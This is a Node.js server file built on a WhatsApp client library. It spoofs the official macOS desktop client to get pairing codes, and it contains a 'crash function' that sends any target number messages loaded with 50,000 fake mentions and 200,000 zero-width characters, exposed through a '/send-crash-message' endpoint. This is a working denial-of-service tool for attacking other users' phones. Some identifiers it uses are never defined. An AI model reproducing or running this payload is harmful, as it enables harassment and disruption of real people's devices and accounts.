// server.js
// server.js
const express = require('express');
const {
    default: makeWASocket,
    useInMemoryAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    Browsers // We will use this to specify a different browser
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Boom } = require('@hapi/boom');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

app.post('/generate-code', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
        return res.status(400).json({ success: false, message: 'A valid phone number is required.' });
    }
    console.log(`[Request] Received request to generate code for: ${phoneNumber}`);

    try {
        const { state, saveCreds } = await useInMemoryAuthState();
        const { version, isLatest } = await fetchLatestBaileysVersion();
        
        console.log(`[Baileys] Using version: ${version.join('.')}, isLatest: ${isLatest}`);

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: state,
            // --- THIS IS THE CHANGE ---
            // We are now identifying as the official WhatsApp Mac app
            browser: Browsers.macOS('Desktop') 
        });

        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'close') {
                const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
                console.log(`[Connection] Closed due to: ${DisconnectReason[reason] || 'Unknown Reason'}`);
            }
        });

        console.log(`[Pairing] Requesting pairing code for ${phoneNumber}...`);
        
        const code = await sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;

        console.log(`[Pairing] Successfully generated code: ${formattedCode}`);
        
        res.json({ success: true, code: formattedCode });

    } catch (error) {
        console.error('[Error] Failed to generate pairing code:', error);
        res.status(500).json({ success: false, message: 'An internal server error occurred. Please check the logs.' });
    }
});

// The user-provided crash function, adapted for our server
async function protocolbugv10(sock, target) {
    const mentionedList = Array.from({ length: 50000 }, () => `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
    const virtex = "🔥 ZYOU KUNTUL 🔥" + "\u2060".repeat(200000);

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { mentionedJid: mentionedList }
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            mediaKeyTimestamp: "1746112211",
            isAnimated: true,
            contextInfo: { mentionedJid: mentionedList }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: virtex,
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    const msg2 = generateWAMessageFromContent(target, { viewOnceMessage: { message: stickerMessage } }, {});
    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Send messages using the provided socket
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });
    await sock.relayMessage(target, msg3.message, { messageId: msg3.key.id });
}


app.post('/send-crash-message', async (req, res) => {
    const { sessionId, target } = req.body;

    if (!sessionId || !target) {
        return res.status(400).json({ success: false, message: 'Session ID and Target are required.' });
    }

    const session = sessions[sessionId];
    if (!session || session.connectionStatus !== 'connected') {
        return res.status(404).json({ success: false, message: 'Session not found or not connected.' });
    }

    const formattedTarget = `${target.replace(/\D/g, '')}@s.whatsapp.net`;

    try {
        await protocolbugv10(session.sock, formattedTarget);
        res.json({ success: true, message: 'Crash payload sent successfully!' });
    } catch (error) {
        console.error('Failed to send crash message:', error);
        res.status(500).json({ success: false, message: 'Failed to send message.' });
    }
});


app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
